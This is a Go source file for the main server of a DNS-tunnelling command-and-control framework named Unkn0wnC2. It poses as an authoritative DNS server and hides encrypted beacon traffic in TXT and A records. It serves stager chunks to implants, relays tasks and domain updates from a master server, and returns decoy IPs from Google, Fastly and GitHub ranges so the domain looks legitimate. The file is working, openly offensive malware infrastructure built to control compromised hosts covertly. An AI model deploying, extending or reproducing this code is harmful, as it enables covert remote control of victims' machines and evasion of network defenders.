/*
	Package main implements the Unkn0wnC2 DNS-based Command & Control server.

This server operates as an authoritative DNS server for a configured domain
while simultaneously handling encrypted C2 communications through DNS queries.
The server forwards legitimate DNS queries to upstream servers while processing
C2 beacon traffic using AES-GCM encryption and Base36 encoding for stealth.
*/
package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

// Global variables
var (
	c2Manager    *C2Manager    // c2Manager handles all C2 operations including beacon management and tasking
	masterClient *MasterClient // masterClient handles communication with Master Server (distributed mode only)
	debugMode    bool          // debugMode enables verbose logging for troubleshooting
)

// Build-time version information (set via -ldflags during build)
var (
	version   = "0.2.0"
	buildDate = "unknown"
	gitCommit = "unknown"
)

/*
	forwardDNSQuery forwards a DNS query to an upstream DNS server and returns the response.
	This is used to forward legitimate DNS queries when the server is acting as an

authoritative server but receives queries for domains it doesn't handle.
*/
func forwardDNSQuery(packet []byte, upstreamAddr string) ([]byte, error) {
	conn, err := net.Dial("udp", upstreamAddr) // Connect to upstream DNS server
	if err != nil {
		if debugMode {
			logf("[Forward] Failed to connect to upstream %s: %v", upstreamAddr, err)
		}
		// Return SERVFAIL if we can't forward
		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
			return serializeMessage(respMsg), nil
		}
		return nil, err
	}
	defer conn.Close()

	// Set timeout for upstream query
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// Forward the original packet
	_, err = conn.Write(packet)
	if err != nil {
		if debugMode {
			logf("[Forward] Failed to send to upstream: %v", err)
		}
		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
			return serializeMessage(respMsg), nil
		}
		return nil, err
	}

	// Read response from upstream
	buffer := make([]byte, 512)
	n, err := conn.Read(buffer)
	if err != nil {
		if debugMode {
			logf("[Forward] Failed to read from upstream: %v", err)
		}
		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
			return serializeMessage(respMsg), nil
		}
		return nil, err
	}

	if debugMode {
		logf("[Forward] Successfully forwarded query to %s, got %d bytes response", upstreamAddr, n)
	} // Return the upstream response
	response := make([]byte, n)
	copy(response, buffer[:n])
	return response, nil
}

// Configuration-based zones initialized from config
var zoneA map[string]string
var zoneAAAA map[string]string
var zoneCNAME map[string]string
var zoneNS map[string]string
var zoneSOA map[string]SOARecord

// SOARecord holds the fields for a DNS SOA record
type SOARecord struct {
	MNAME   string // Primary name server
	RNAME   string // Admin email (dots instead of @)
	Serial  uint32 // Zone serial number
	Refresh uint32 // Seconds before secondary checks for updates
	Retry   uint32 // Seconds before secondary retries after failed refresh
	Expire  uint32 // Seconds before secondary stops answering
	Minimum uint32 // TTL for negative caching
}

// getOutboundIP gets the preferred outbound IP of this machine

// initializeZones sets up our authoritative zones based on configuration
// initializeZones sets up the DNS zone records for the authoritative domain,
// creating NS and A records to establish proper DNS authority.
func initializeZones(cfg Config) {
	// Initialize maps
	zoneA = make(map[string]string)
	zoneAAAA = make(map[string]string)
	zoneCNAME = make(map[string]string)
	zoneNS = make(map[string]string)
	zoneSOA = make(map[string]SOARecord)

	// Set up NS records for our domain
	zoneNS[cfg.Domain] = cfg.NS1

	// Set up SOA record for our domain
	zoneSOA[cfg.Domain] = SOARecord{
		MNAME:   cfg.NS1,                     // Primary nameserver
		RNAME:   "admin." + cfg.Domain + ".", // Admin email as admin@domain
		Serial:  1,                           // Zone serial
		Refresh: 3600,                        // 1 hour
		Retry:   600,                         // 10 minutes
		Expire:  86400,                       // 1 day
		Minimum: 300,                         // 5 minute negative cache TTL
	}

	// Determine server IP for A records
	serverIP := cfg.SvrAddr
	zoneA[cfg.NS1] = serverIP
	zoneA[cfg.NS2] = serverIP // Both can point to same IP for simplicity

	// Optional: Set up apex record
	zoneA[cfg.Domain] = serverIP
} // generateRandomIP generates a random, legitimate-looking IP address
// Avoids private ranges and common reserved addresses
// generateRandomIP creates a random private IPv4 address in the 192.168.x.x range
// for use in DNS responses when specific IPs are not configured.
func generateRandomIP() string {
	// Use publicly routable IP ranges that look legitimate
	publicRanges := []struct {
		base []byte
		mask byte
	}{
		{[]byte{1, 0, 0, 0}, 8},      // 1.0.0.0/8 (mostly public)
		{[]byte{8, 8, 0, 0}, 16},     // 8.8.0.0/16 (Google DNS range area)
		{[]byte{74, 125, 0, 0}, 16},  // 74.125.0.0/16 (Google range)
		{[]byte{151, 101, 0, 0}, 16}, // 151.101.0.0/16 (Fastly CDN)
		{[]byte{185, 199, 0, 0}, 16}, // 185.199.0.0/16 (GitHub Pages)
	}

	// Select a random range
	selectedRange := publicRanges[rand.Intn(len(publicRanges))]

	// Generate random IP within that range
	ip := make([]byte, 4)
	copy(ip, selectedRange.base)

	// Randomize the host portion based on mask
	switch selectedRange.mask {
	case 8:
		ip[1] = byte(rand.Intn(256))
		ip[2] = byte(rand.Intn(256))
		ip[3] = byte(1 + rand.Intn(254)) // Avoid .0 and .255
	case 16:
		ip[2] = byte(rand.Intn(256))
		ip[3] = byte(1 + rand.Intn(254)) // Avoid .0 and .255
	}

	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

// toIPv4 converts a dotted string like "1.2.3.4" into 4 bytes.
// toIPv4 converts a dotted decimal IP address string to its 4-byte representation,
// returning the bytes and a boolean indicating successful conversion.
func toIPv4(s string) ([]byte, bool) {
	// Trim whitespace to handle accidental spaces
	s = strings.TrimSpace(s)
	ip := net.ParseIP(s)
	if ip == nil {
		return nil, false
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return nil, false
	}
	return []byte(ip4), true
}

// toIPv6 converts an IPv6 address string to its 16-byte representation,
// returning the bytes and a boolean indicating successful conversion.
func toIPv6(s string) ([]byte, bool) {
	// Trim whitespace to handle accidental spaces
	s = strings.TrimSpace(s)
	ip := net.ParseIP(s)
	if ip == nil {
		return nil, false
	}
	ip6 := ip.To16()
	if ip6 == nil || ip.To4() != nil { // ensure it's real IPv6, not IPv4-mapped
		return nil, false
	}
	return []byte(ip6), true
}

// handleQuery takes a raw DNS packet, parses it, and builds a response.
// Enhanced to handle C2 beacon communication via DNS queries.
// Acts as authoritative DNS server for configured domain.
// handleQuery processes incoming DNS queries, routing legitimate DNS traffic upstream
// and handling C2 communications through the C2Manager for stealth operations.
func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
	// 1) Parse the incoming message (header + questions)
	msg, _, err := parseMessage(packet)
	if err != nil {
		// If parsing fails, return a minimal FORMERR response
		resp := buildResponse(DNSMessage{Header: DNSHeader{ID: 0}}, nil, 1 /*FORMERR*/)
		return serializeMessage(resp), nil
	}

	// Only handle single-question queries (standard for DNS)
	if msg.Header.QDCount != 1 {
		resp := buildResponse(msg, nil, 1 /*FORMERR*/)
		return serializeMessage(resp), nil
	}

	// Check for C2 beacon communication first
	for _, q := range msg.Questions {
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")

		// Process potential C2 beacon query
		if c2Response, isC2 := c2Manager.processBeaconQuery(qname, clientIP); isC2 {
			// Create C2 response
			var answers []DNSResourceRecord

			// Debug: Log the query name format
			logf("[DEBUG] Query Name (original): '%s' (len=%d)", q.Name, len(q.Name))
			logf("[DEBUG] Query Name (processed): '%s' (len=%d)", qname, len(qname))

			switch q.Type {
			case 1: // A record - encode simple responses in IP
				if c2Response == "ACK" {
					// Use a special IP to indicate acknowledgment
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   1,                    // Short TTL for C2 traffic
						RData: []byte{127, 0, 0, 1}, // localhost
					})
				} else {
					// Use different IP to indicate task available
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   1,
						RData: []byte{127, 0, 0, 2}, // localhost+1
					})
				}

			case 16: // TXT record - encode response
				var encoded string

				// CHUNK responses are plain text (base64 data is already DNS-safe)
				// META responses need base36 encoding for DNS compatibility
				if strings.HasPrefix(c2Response, "CHUNK|") {
					// CHUNK responses sent as plain text (data is already base64)
					encoded = c2Response
				} else if strings.HasPrefix(c2Response, "META|") {
					// Stager META responses - use base36 encoding only (no encryption)
					encoded = base36EncodeString(c2Response)
					// Debug: Log what we're encoding and the result
					logf("[DEBUG] META Response: %s", c2Response)
					logf("[DEBUG] Base36 Encoded (len=%d): %s", len(encoded), encoded)
				} else {
					// Beacon response - use AES-GCM + base36
					var encErr error
					encoded, encErr = encryptAndEncode(c2Response, c2Manager.GetEncryptionKey())
					if encErr != nil {
						// Fallback to plain response if encryption fails
						encoded = c2Response
					}
				} // TXT records need proper length-prefixed format
				// Each string in a TXT record can be max 255 bytes
				var txtData []byte

				// Split into 255-byte chunks if needed
				for len(encoded) > 0 {
					chunkSize := len(encoded)
					if chunkSize > 255 {
						chunkSize = 255
					}
					chunk := encoded[:chunkSize]
					encoded = encoded[chunkSize:]

					// Add length prefix and chunk
					txtData = append(txtData, byte(len(chunk)))
					txtData = append(txtData, []byte(chunk)...)
				}

				answers = append(answers, DNSResourceRecord{
					Name:  q.Name,
					Type:  16,
					Class: 1,
					TTL:   1,
					RData: txtData,
				})

				// Debug: Log the TXT record details
				logf("[DEBUG] TXT RData length: %d bytes", len(txtData))
				logf("[DEBUG] TXT RData hex: %x", txtData)
			}

			respMsg := buildResponse(msg, answers, 0)
			serialized := serializeMessage(respMsg)
			logf("[DEBUG] Response packet length: %d bytes", len(serialized))
			return serialized, nil
		}
	}

	// 2) Build answers for questions (A, AAAA, CNAME, NS)
	var answers []DNSResourceRecord
	var additionals []DNSResourceRecord
	for _, q := range msg.Questions {
		// Normalize name: our zone keys are lower-case without trailing dot
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
		if q.Class != 1 /*IN*/ {
			continue
		}

		switch q.Type {
		case 1: // A
			if ipStr, ok := zoneA[qname]; ok {
				// Return configured static IP (like for NS records)
				if ip4, ok2 := toIPv4(ipStr); ok2 {
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   60,
						RData: ip4,
					})
				}
			} else if strings.HasSuffix(qname, cfg.Domain) {
				// For subdomains of our domain that aren't static, return random IP
				// This makes it look like a legitimate domain with various services
				randomIP := generateRandomIP()
				if ip4, ok2 := toIPv4(randomIP); ok2 {
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   300, // Longer TTL for random responses
						RData: ip4,
					})
				}
			} else {
				// In distributed mode, also respond to queries for other potential C2 domains
				// Check if this looks like a C2 query (long subdomain with multiple labels)
				parts := strings.Split(qname, ".")
				if len(parts) >= 3 {
					subdomain := strings.Join(parts[:len(parts)-2], ".")
					// If subdomain is long and contains only alphanumeric chars, likely C2
					if len(subdomain) > 20 {
						randomIP := generateRandomIP()
						if ip4, ok2 := toIPv4(randomIP); ok2 {
							answers = append(answers, DNSResourceRecord{
								Name:  q.Name,
								Type:  1,
								Class: 1,
								TTL:   1, // Short TTL for C2-like queries
								RData: ip4,
							})
						}
					}
				}
			}

		case 28: // AAAA
			if ipStr, ok := zoneAAAA[qname]; ok {
				if ip6, ok2 := toIPv6(ipStr); ok2 {
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  28,
						Class: 1,
						TTL:   60,
						RData: ip6,
					})
				}
			}

		case 5: // CNAME
			if tgt, ok := zoneCNAME[qname]; ok {
				// CNAME RDATA is the target name encoded as a domain name; we'll let serializer do name bytes,
				// but since our serializer currently expects RData raw bytes, we need to store name wire here.
				// Simpler approach: put a placeholder; we will pack as name in additional handling below.
				// Instead, we choose to not use RData for name-typed RRs directly; we'll special-case in serialization later if needed.
				// For now, encode name without compression for RData (simple but valid); reuse appendName then take tail.
				nameBytes := appendName(nil, tgt)
				answers = append(answers, DNSResourceRecord{
					Name:  q.Name,
					Type:  5,
					Class: 1,
					TTL:   60,
					RData: nameBytes,
				})
				// Provide glue A/AAAA for target if present
				tname := strings.TrimSuffix(strings.ToLower(tgt), ".")
				if ipStr, ok := zoneA[tname]; ok {
					if ip4, ok2 := toIPv4(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  tgt,
							Type:  1,
							Class: 1,
							TTL:   60,
							RData: ip4,
						})
					}
				}
				if ipStr, ok := zoneAAAA[tname]; ok {
					if ip6, ok2 := toIPv6(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  tgt,
							Type:  28,
							Class: 1,
							TTL:   60,
							RData: ip6,
						})
					}
				}
			}

		case 2: // NS
			// Return NS rr for zone apex
			if ns, ok := zoneNS[qname]; ok {
				nsWire := appendName(nil, ns)
				answers = append(answers, DNSResourceRecord{
					Name:  q.Name,
					Type:  2,
					Class: 1,
					TTL:   300,
					RData: nsWire,
				})
				// Optionally include A/AAAA for the NS host in additionals
				h := strings.TrimSuffix(strings.ToLower(ns), ".")
				if ipStr, ok := zoneA[h]; ok {
					if ip4, ok2 := toIPv4(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  ns,
							Type:  1,
							Class: 1,
							TTL:   300,
							RData: ip4,
						})
					}
				}
				if ipStr, ok := zoneAAAA[h]; ok {
					if ip6, ok2 := toIPv6(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  ns,
							Type:  28,
							Class: 1,
							TTL:   300,
							RData: ip6,
						})
					}
				}
			}

		case 6: // SOA
			// Return SOA record for zone apex
			if soa, ok := zoneSOA[qname]; ok {
				// Encode SOA RDATA: MNAME + RNAME + 5x32-bit values
				var soaData []byte
				soaData = appendName(soaData, soa.MNAME)
				soaData = appendName(soaData, soa.RNAME)
				soaData = append(soaData,
					byte(soa.Serial>>24), byte(soa.Serial>>16), byte(soa.Serial>>8), byte(soa.Serial),
					byte(soa.Refresh>>24), byte(soa.Refresh>>16), byte(soa.Refresh>>8), byte(soa.Refresh),
					byte(soa.Retry>>24), byte(soa.Retry>>16), byte(soa.Retry>>8), byte(soa.Retry),
					byte(soa.Expire>>24), byte(soa.Expire>>16), byte(soa.Expire>>8), byte(soa.Expire),
					byte(soa.Minimum>>24), byte(soa.Minimum>>16), byte(soa.Minimum>>8), byte(soa.Minimum),
				)
				answers = append(answers, DNSResourceRecord{
					Name:  q.Name,
					Type:  6,
					Class: 1,
					TTL:   300,
					RData: soaData,
				})
			}
		}
	}

	// If we formed answers, return them
	if len(answers) > 0 {
		rcode := uint8(0) // NOERROR
		respMsg := buildResponse(msg, answers, rcode)
		respMsg.Additionals = additionals
		respMsg.Header.ARCount = uint16(len(respMsg.Additionals))
		return serializeMessage(respMsg), nil
	}

	// No answer found - as authoritative server, we should respond authoritatively
	// Check if this is a query for our domain
	for _, q := range msg.Questions {
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
		if strings.HasSuffix(qname, cfg.Domain) {
			// This is for our domain but we don't have a record - return NXDOMAIN
			respMsg := buildResponse(msg, nil, 3 /*NXDOMAIN*/)
			return serializeMessage(respMsg), nil
		}
	}

	// Query not for our domain - forward to upstream DNS server
	if cfg.ForwardDNS {
		return forwardDNSQuery(packet, cfg.UpstreamDNS)
	}

	// If forwarding disabled, return REFUSED
	respMsg := buildResponse(msg, nil, 5 /*REFUSED*/)
	return serializeMessage(respMsg), nil
}

func main() {
	// Parse command line flags
	debugFlag := flag.Bool("d", false, "Enable debug mode")
	bindAddrFlag := flag.String("bind-addr", "", "Override bind address (e.g., 0.0.0.0)")
	bindPortFlag := flag.Int("bind-port", 0, "Override bind port (default: 53)")
	flag.Parse()

	// Load embedded configuration
	cfg, err := LoadConfig()
	if err != nil {
		panic(fmt.Sprintf("Failed to load configuration: %v\nThis binary must be built using the builder with embedded configuration.", err))
	}

	// Command line flags override embedded config
	if *debugFlag {
		cfg.Debug = true
	}
	if *bindAddrFlag != "" {
		cfg.BindAddr = *bindAddrFlag
	}
	if *bindPortFlag != 0 {
		cfg.BindPort = *bindPortFlag
	}
	debugMode = cfg.Debug

	// SECURITY: Warn if using default encryption key
	if cfg.EncryptionKey == "MySecretC2Key123!@#DefaultChange" {
		fmt.Println("⚠️  WARNING: Using default encryption key! Change this in production!")
		fmt.Println("⚠️  Set encryption_key in config.json or via environment variable")
	}

	// Initialize C2Manager with database for persistence
	c2Manager = NewC2Manager(debugMode, cfg.EncryptionKey, cfg.StagerJitter, DatabaseFileName, cfg.Domain)

	bindAddr := fmt.Sprintf("%s:%d", cfg.BindAddr, cfg.BindPort)

	// Use "udp4" to force IPv4 only (avoid IPv6 binding issues)
	pc, err := net.ListenPacket("udp4", bindAddr)
	if err != nil {
		panic(fmt.Sprintf("failed to listen on %s: %v", bindAddr, err))
	}
	defer pc.Close()

	// Initialize our authoritative zones
	initializeZones(cfg)

	// Note: Go 1.20+ automatically seeds the global random generator
	// No need for explicit rand.Seed() call

	// Log the actual local address we're bound to
	localAddr := pc.LocalAddr()

	// Display ASCII art banner
	fmt.Println("\033[0;31m") // Red color
	fmt.Println("  _    _       _           ___                    _____ ___  ")
	fmt.Println(" | |  | |     | |         / _ \\                  / ____|__ \\ ")
	fmt.Println(" | |  | |_ __ | | ___ __ | | | |_      ___ __   | |       ) |")
	fmt.Println(" | |  | | '_ \\| |/ / '_ \\| | | \\ \\ /\\ / / '_ \\  | |      / / ")
	fmt.Println(" | |__| | | | |   <| | | | |_| |\\ V  V /| | | | | |____ / /_ ")
	fmt.Println("  \\____/|_| |_|_|\\_\\_| |_|\\___/  \\_/\\_/ |_| |_|  \\_____|____|")
	fmt.Println("\033[0m") // Reset color
	fmt.Println()

	fmt.Printf("\033[0;32m==================================================\n")
	fmt.Printf("DNS C2 Server v%s\n", version)
	fmt.Printf("Build: %s (commit: %s)\n", buildDate, gitCommit)
	fmt.Printf("==================================================\033[0m\n")
	fmt.Printf("Authoritative DNS Server for: %s\n", cfg.Domain)
	fmt.Printf("Listening on: %s (local: %s)\n", bindAddr, localAddr.String())

	if cfg.ForwardDNS {
		fmt.Printf("DNS Forwarding: Enabled (upstream: %s)\n", cfg.UpstreamDNS)
	} else {
		fmt.Printf("DNS Forwarding: Disabled (authoritative only)\n")
	}

	// Warn if binding to 0.0.0.0 (could cause interface issues)
	if cfg.BindAddr == "0.0.0.0" {
		fmt.Println("WARNING: Binding to 0.0.0.0 - responses may come from unexpected interface")
	}

	// DISTRIBUTED MODE: Connect to Master Server
	fmt.Printf("\n\033[0;36m==================================================\033[0m\n")
	fmt.Printf("\033[0;36mMode: DISTRIBUTED (Lieutenant)\033[0m\n")
	fmt.Printf("Master Server: %s\n", cfg.MasterServer)
	fmt.Printf("Server ID: %s\n", cfg.MasterServerID)
	fmt.Printf("\033[0;36m==================================================\033[0m\n\n")

	// Initialize Master Client
	masterClient = NewMasterClient(cfg.MasterServer, cfg.MasterServerID, cfg.MasterAPIKey, debugMode)

	// Perform initial check-in
	fmt.Println("Connecting to Master Server...")
	stats := map[string]interface{}{
		"domain":       cfg.Domain,
		"bind_addr":    cfg.BindAddr,
		"beacon_count": 0,
		"startup_time": time.Now().Unix(),
	}

	_, _, err = masterClient.Checkin(stats)
	if err != nil {
		fmt.Printf("⚠️  WARNING: Initial checkin to Master Server failed: %v\n", err)
		fmt.Println("Continuing in resilient mode (will retry in background)")
	} else {
		fmt.Println("✓ Connected to Master Server successfully")
	}

	// Start periodic check-in (every 30 seconds)
	masterClient.StartPeriodicCheckin(30*time.Second, func() map[string]interface{} {
		beacons := c2Manager.GetBeacons()
		return map[string]interface{}{
			"domain":       cfg.Domain,
			"bind_addr":    cfg.BindAddr,
			"beacon_count": len(beacons),
			"uptime":       time.Since(time.Now()).Seconds(),
		}
	}, func(cacheTasks []StagerCacheTask) {
		// Handle stager cache tasks pushed from Master
		if len(cacheTasks) > 0 {
			logf("[C2] 📥 Received %d stager cache task(s) from Master", len(cacheTasks))
		}

		for _, task := range cacheTasks {
			logf("[C2] 📦 Processing cache: %s (%d chunks, %d bytes total)",
				task.ClientBinaryID, task.TotalChunks, len(task.Chunks))

			// Cache all chunks in local database
			if c2Manager.db == nil {
				logf("[C2] ⚠️  ERROR: Database is nil, cannot cache chunks!")
				continue
			}

			if err := c2Manager.db.CacheStagerChunks(task.ClientBinaryID, task.Chunks); err != nil {
				logf("[C2] ❌ Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
			} else {
				logf("[C2] ✅ Successfully cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
			}
		}
	}, func(domainUpdates []string) {
		// Handle domain updates from Master - queue update_domains task for all beacons
		if len(domainUpdates) == 0 {
			return
		}

		logf("[C2] 🌐 Received domain update from Master: %v", domainUpdates)

		// Convert domain list to JSON
		domainsJSON, err := json.Marshal(domainUpdates)
		if err != nil {
			logf("[C2] ❌ Failed to marshal domain list: %v", err)
			return
		}

		// Queue update_domains task for ALL active beacons
		beacons := c2Manager.GetBeacons()
		taskCommand := fmt.Sprintf("update_domains:%s", string(domainsJSON))

		activeCount := 0
		for _, beacon := range beacons {
			// AddTask returns the taskID, we don't need to generate it
			taskID := c2Manager.AddTask(beacon.ID, taskCommand)
			if taskID != "" {
				logf("[C2] 📤 Queued domain update task %s for beacon %s", taskID, beacon.ID)
				activeCount++
			}
		}

		logf("[C2] ✅ Queued domain updates for %d beacon(s)", activeCount)
	})

	// Start periodic task polling (every 10 seconds)
	masterClient.StartPeriodicTaskPoll(10*time.Second, func(tasks []TaskResponse) {
		for _, task := range tasks {
			// Queue task in C2Manager using the new AddTaskFromMaster function
			// This tracks both local and master task IDs for proper result submission
			c2Manager.AddTaskFromMaster(task.ID, task.BeaconID, task.Command)
			if debugMode {
				logf("[Distributed] Received task %s from master for beacon %s", task.ID, task.BeaconID)
			}
		}
	})

	// Start periodic beacon sync (every 30 seconds)
	// This ensures all DNS servers know about beacons registered on other servers
	masterClient.StartPeriodicBeaconSync(30*time.Second, func(beacons []BeaconData) {
		for _, beaconData := range beacons {
			// Sync beacon to local C2Manager
			c2Manager.SyncBeaconFromMaster(beaconData)
		}
		if debugMode {
			logf("[Distributed] Synced %d beacon(s) from master", len(beacons))
		}
	})

	fmt.Println("Console disabled (distributed mode - use Master server web UI)")
	fmt.Println()

	// Setup graceful shutdown
	shutdownChan := make(chan os.Signal, 1)
	signal.Notify(shutdownChan, os.Interrupt, syscall.SIGTERM)

	// Context for shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start DNS server in goroutine
	go func() {
		// Increase read buffer if needed for performance
		_ = pc.SetReadDeadline(time.Time{})

		buf := make([]byte, 512) // typical DNS UDP packet size
		for {
			select {
			case <-ctx.Done():
				return
			default:
				// Set read timeout to allow checking ctx.Done periodically
				pc.SetReadDeadline(time.Now().Add(1 * time.Second))

				n, raddr, err := pc.ReadFrom(buf)
				if err != nil {
					// Check if it's a timeout, if so continue to check ctx
					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
						continue
					}
					if ctx.Err() != nil {
						return
					}
					logf("read error: %v", err)
					continue
				}
				pkt := make([]byte, n)
				copy(pkt, buf[:n])

				// Log incoming queries (debug mode only)
				if debugMode {
					if msg, _, err := parseMessage(pkt); err == nil {
						for _, q := range msg.Questions {
							qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
							logf("client=%s id=0x%04X q=%s type=%d class=%d",
								raddr.String(), msg.Header.ID, q.Name, q.Type, q.Class)

							// Check if this looks like C2 traffic
							if strings.Contains(qname, cfg.Domain) {
								parts := strings.SplitN(qname, ".", 2)
								if len(parts) > 0 && len(parts[0]) > 20 {
									logf("Possible C2 traffic detected from %s", raddr.String())
								}
							}
						}
					} else {
						logf("client=%s parse_error=%v", raddr.String(), err)
					}
				}

				// Handle the query
				clientIP := raddr.String()
				if host, _, err := net.SplitHostPort(clientIP); err == nil {
					clientIP = host
				}

				resp, err := handleQuery(pkt, cfg, clientIP)

				if err != nil {
					logf("ERROR handling query: %v", err)
					continue
				}

				if len(resp) == 0 {
					if debugMode {
						logf("WARNING: empty response generated")
					}
					continue
				}

				// Send the response back to the same address
				bytesWritten, writeErr := pc.WriteTo(resp, raddr)
				if writeErr != nil {
					logf("ERROR writing response: %v", writeErr)
					continue
				}

				// Log only in debug mode
				if debugMode {
					if validateMsg, _, parseErr := parseMessage(resp); parseErr == nil {
						logf("→ Sent %d bytes, ID=0x%04X, answers=%d to %s",
							bytesWritten, validateMsg.Header.ID, validateMsg.Header.ANCount, raddr.String())
					}
				}
			}
		}
	}()

	// Wait for shutdown signal
	<-shutdownChan
	fmt.Println("\n🛑 Shutting down DNS C2 Server...")

	// Cancel context to stop DNS server
	cancel()

	// Close database
	if c2Manager != nil && c2Manager.db != nil {
		if err := c2Manager.db.Close(); err != nil {
			fmt.Printf("Warning: Error closing database: %v\n", err)
		}
	}

	// Give goroutines time to finish
	time.Sleep(500 * time.Millisecond)

	fmt.Println("✓ DNS C2 Server stopped gracefully")
}
